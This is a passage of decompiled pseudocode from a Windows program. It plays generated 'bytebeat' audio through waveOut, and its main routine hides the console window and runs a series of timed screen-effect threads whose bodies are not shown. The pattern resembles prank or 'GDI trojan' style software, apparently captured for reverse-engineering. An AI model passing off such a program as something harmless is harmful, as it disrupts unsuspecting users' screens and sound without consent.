  pwfx.nAvgBytesPerSec = 48000;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  v0 = 0;
  v1 = v9;
  do
  {
    ++v1;
    v2 = (v0 >> 4) * (v0 >> 6);
    v3 = v0 >> 10;
    v4 = v0++;
    *(v1 - 1) = v2 - v4 * v3;
  }
  while ( v0 < 0xEA600 );
  pwh.lpData = v9;
  *(_QWORD *)&pwh.dwBufferLength = 960000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (0000000140005FB0) ----------------------------------------------------
MMRESULT sub_140005FB0()
{
  unsigned int v0; // r9d
  char *v1; // r10
  char v2; // r8
  unsigned int v3; // eax
  char v4; // cl
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v9[960000]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 48000;
  pwfx.nAvgBytesPerSec = 48000;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  v0 = 0;
  v1 = v9;
  do
  {
    ++v1;
    v2 = (v0 >> 5) * (v0 >> 6);
    v3 = v0 >> 12;
    v4 = v0++;
    *(v1 - 1) = v2 - v4 * v3;
  }
  while ( v0 < 0xEA600 );
  pwh.lpData = v9;
  *(_QWORD *)&pwh.dwBufferLength = 960000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (0000000140006110) ----------------------------------------------------
MMRESULT sub_140006110()
{
  unsigned int v0; // r8d
  char *v1; // r9
  unsigned int v2; // ecx
  char v3; // dl
  unsigned int v4; // eax
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v9[441008]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 11025;
  pwfx.nAvgBytesPerSec = 11025;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  v0 = 0;
  v1 = v9;
  do
  {
    ++v1;
    v2 = v0;
    v3 = v0 * (v0 | (v0 >> 2) | (v0 >> 7));
    v4 = v0++ >> 9;
    *(v1 - 1) = v3 - (v4 | (v2 >> 11));
  }
  while ( v0 < 0x6BAA8 );
  pwh.lpData = v9;
  *(_QWORD *)&pwh.dwBufferLength = 441000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (0000000140006270) ----------------------------------------------------
MMRESULT sub_140006270()
{
  unsigned int v0; // r9d
  char *v1; // r10
  char v2; // r8
  unsigned int v3; // eax
  char v4; // cl
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v9[441008]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 22050;
  pwfx.nAvgBytesPerSec = 22050;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  v0 = 0;
  v1 = v9;
  do
  {
    ++v1;
    v2 = (v0 >> 4) * (v0 >> 6);
    v3 = v0 >> 9;
    v4 = v0++;
    *(v1 - 1) = v2 - v4 * v3;
  }
  while ( v0 < 0x6BAA8 );
  pwh.lpData = v9;
  *(_QWORD *)&pwh.dwBufferLength = 441000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (00000001400063D0) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  HWND ConsoleWindow; // rax
  HANDLE Thread; // rbx
  HANDLE v5; // rbx
  HANDLE v6; // rbx
  HANDLE v7; // rbx
  HANDLE v8; // rbx
  HANDLE v9; // rbx
  HANDLE v10; // rbx
  HANDLE v11; // rbx
  HANDLE v12; // rbx

  ConsoleWindow = GetConsoleWindow();
  ShowWindow(ConsoleWindow, 0);
  Thread = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)StartAddress, 0LL, 0, 0LL);
  sub_140005660();
  Sleep(0x4E20u);
  TerminateThread(Thread, 0);
  CloseHandle(Thread);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  v5 = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)sub_140001A00, 0LL, 0, 0LL);
  sub_140005830();
  Sleep(0x4E20u);
  TerminateThread(v5, 0);
  CloseHandle(v5);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  v6 = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)sub_140001F50, 0LL, 0, 0LL);
  sub_140005990();
  Sleep(0x4E20u);
  TerminateThread(v6, 0);
  CloseHandle(v6);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  v7 = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)sub_1400026E0, 0LL, 0, 0LL);
  sub_140005B70();
  Sleep(0x4E20u);
  TerminateThread(v7, 0);
  CloseHandle(v7);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  v8 = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)sub_140002F30, 0LL, 0, 0LL);
  sub_140005CE0();
  Sleep(0x4E20u);
  TerminateThread(v8, 0);
  CloseHandle(v8);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  v9 = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)sub_140003300, 0LL, 0, 0LL);
  sub_140005E50();
  Sleep(0x4E20u);
  TerminateThread(v9, 0);
  CloseHandle(v9);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  v10 = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)sub_1400039E0, 0LL, 0, 0LL);
  sub_140005FB0();
  Sleep(0x4E20u);
  TerminateThread(v10, 0);
  CloseHandle(v10);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  v11 = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)sub_140004560, 0LL, 0, 0LL);
  sub_140006110();
  Sleep(0x4E20u);
  TerminateThread(v11, 0);
  CloseHandle(v11);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  v12 = CreateThread(0LL, 0LL, (LPTHREAD_START_ROUTINE)sub_140004AE0, 0LL, 0, 0LL);
  sub_140006270();
  Sleep(0x4E20u);
  TerminateThread(v12, 0);
  CloseHandle(v12);
  InvalidateRect(0LL, 0LL, 0);
  Sleep(0x64u);
  return 0;
}

//----- (0000000140006E4C) ----------------------------------------------------
__int64 __fastcall UserMathErrorFunction(struct _exception *a1)
{
  return 0LL;
}

//----- (0000000140006E60) ----------------------------------------------------
void sub_140006E60()
{
  InitializeSListHead(&stru_14000A610);
}
// 14000A610: using guessed type union _SLIST_HEADER stru_14000A610;

//----- (0000000140006E70) ----------------------------------------------------
char sub_140006E70()
{
  return 1;
}

//----- (0000000140006E78) ----------------------------------------------------
void *sub_140006E78()
{
  return &unk_14000A620;
}

//----- (0000000140006E80) ----------------------------------------------------
void *sub_140006E80()
{
  return &unk_14000A628;
}

//----- (0000000140006EB0) ----------------------------------------------------
void *sub_140006EB0()
{
  return &unk_14000E658;
}

//----- (0000000140006EB8) ----------------------------------------------------
void *sub_140006EB8()
{
  return &unk_14000E650;
}

//----- (0000000140006EC0) ----------------------------------------------------
void sub_140006EC0()
{
  dword_14000A630 = 0;
}
// 14000A630: using guessed type int dword_14000A630;

//----- (00000001400070DC) ----------------------------------------------------
void sub_1400070DC()
{
  void (**i)(void); // rbx

  for ( i = qword_140008AD8; i < qword_140008AD8; ++i )
  {
    if ( *i )
      (*i)();
  }
}
// 140008AD8: using guessed type void (*qword_140008AD8[2])(void);

//----- (0000000140007118) ----------------------------------------------------
void __fastcall sub_140007118()
{
  void (**i)(void); // rbx

  for ( i = &qword_140008AE8; i < &qword_140008AE8; ++i )
  {
    if ( *i )
      (*i)();
  }
}
